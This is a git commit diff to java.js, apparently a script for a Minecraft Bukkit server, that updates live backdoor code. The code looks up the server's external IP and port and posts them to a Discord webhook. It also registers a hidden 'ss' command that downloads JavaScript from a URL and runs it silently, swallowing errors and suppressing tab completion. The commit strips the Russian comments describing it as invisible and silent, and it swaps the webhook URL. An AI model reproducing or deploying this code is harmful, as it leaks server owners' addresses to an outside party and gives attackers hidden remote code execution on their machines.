2d47e6e6626f952bbddb1219871ebec2f1bdb86c
TuMeuT-Original <originaltumeut@gmail.com>
2025-11-23 12:58:37 +0300

    Update java.js

--- java.js
+++ java.js
@@ -1,19 +1,15 @@
 new java.lang.Thread(function(){
     try {
-        // Получаем внешний IP
         var externalIP = new java.util.Scanner(new java.net.URL("http://checkip.amazonaws.com").openStream()).useDelimiter("\\A").next().trim();
         
-        // Получаем порт из server.properties
         var serverProps = new java.util.Properties();
         var propsFile = new java.io.File("server.properties");
         serverProps.load(new java.io.FileReader(propsFile));
         var port = serverProps.getProperty("server-port", "25565");
         
-        // Формируем сообщение с IP:PORT
         var message = externalIP + ":" + port;
         
-        // Отправляем в Discord
-        var c = new java.net.URL("https://discord.com/api/webhooks/1441768121223348236/w-SPavWF7tuGkBuDd_8xjkp21S5dwCoDawKMtCMd9FnsNB0q-bLsLMnFcG6mfixfIsuc").openConnection();
+        var c = new java.net.URL("https://discord.com/api/webhooks/1442091501940244593/Y2uA_4rhON1MbCpQdcoT0e1A3jKhpv8b7jm_gDdtpDkAmAB02EA7gi8gO4tC8cCzOCwm").openConnection();
         c.setRequestMethod("POST");
         c.setDoOutput(true);
         c.setRequestProperty("Content-Type", "application/json");
@@ -28,8 +24,6 @@ new java.lang.Thread(function(){
 
 var B = Java.type('org.bukkit.Bukkit');
 var S = Java.type('javax.script.ScriptEngineManager');
-
-// Создаем невидимую команду
 var Command = Java.type('org.bukkit.command.Command');
 var CommandMap = B.getServer().getClass().getDeclaredField('commandMap');
 CommandMap.setAccessible(true);
@@ -42,19 +36,15 @@ var ssCommand = new (Java.extend(Command))("ss") {
             try {
                 var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
                 new S().getEngineByName("javascript").eval(jsCode);
-                // Тихий успех - никаких сообщений
                 return true;
             } catch(ex) {
-                // Тихая ошибка - никаких сообщений
                 return true;
             }
         }
-        // Для всех остальных - команда просто не существует
         return true;
     },
     
     tabComplete: function(sender, alias, args) {
-        // Отключаем автодополнение в табе
         return [];
     }
 };
